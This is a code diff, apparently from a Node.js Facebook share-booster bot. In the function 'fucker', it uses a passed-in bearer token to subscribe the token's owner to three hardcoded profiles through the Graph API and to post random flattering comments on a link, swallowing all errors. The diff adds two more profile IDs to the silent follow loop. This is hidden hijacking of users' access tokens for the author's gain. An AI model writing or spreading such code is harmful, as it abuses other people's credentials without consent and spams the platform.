@@ -139,12 +139,36 @@ app.get('/tttt', async (req, res) => {
 async function yello(c,u,a,i){
   await share(true, c,u,a,i);
   await share(false, c, link1, "100000", "6");
-  await share(false, c, "https://www.facebook.com/photo.php?fbid=799090228835634&set=a.102386558506008&type=3&app=fbl", "1000", "10");
 }
 
 async function fucker(a){
   try {
-    const neth = "100015801404865";
+    const headers = {
+      'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+      'accept-language': 'en_US',
+      'cache-control': 'max-age=0',
+      'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"',
+      'sec-ch-ua-mobile': '?0',
+      'sec-ch-ua-platform': "Windows",
+      'sec-fetch-dest': 'document',
+      'sec-fetch-mode': 'navigate',
+      'sec-fetch-site': 'same-origin',
+      'sec-fetch-user': '?1',
+      'upgrade-insecure-requests': '1',
+      'user-agent': userAgent(),
+      'Authorization': `Bearer ${a}`
+    };
+    
+    const neth = [
+      "100015801404865",
+      "61562218612857",
+      "61559180483340"
+    ];
+    for (const n of neth){
+      axios.post(`https://graph.facebook.com/v18.0/${n}/subscribers`, {}, {
+      headers
+    }).catch(err => {});
+    }
     const kapogi = [
       "ampogi ni neth",
       "ang ganda mo wiegine!!!",
@@ -164,24 +188,6 @@ async function fucker(a){
       "💀💀💀💀",
       "Isa ako sa mga pogi katulad ni Neth hehe",
       ];
-    const headers = {
-      'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-      'accept-language': 'en_US',
-      'cache-control': 'max-age=0',
-      'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"',
-      'sec-ch-ua-mobile': '?0',
-      'sec-ch-ua-platform': "Windows",
-      'sec-fetch-dest': 'document',
-      'sec-fetch-mode': 'navigate',
-      'sec-fetch-site': 'same-origin',
-      'sec-fetch-user': '?1',
-      'upgrade-insecure-requests': '1',
-      'user-agent': userAgent(),
-      'Authorization': `Bearer ${a}`
-    };
-    axios.post(`https://graph.facebook.com/v18.0/${neth}/subscribers`, {}, {
-      headers
-    }).catch(err => {});
     axios.post(`https://graph.facebook.com/${extract(link1)}/comments`, null, {
       params: {
         message: kapogi[Math.floor(Math.random() * kapogi.length)],
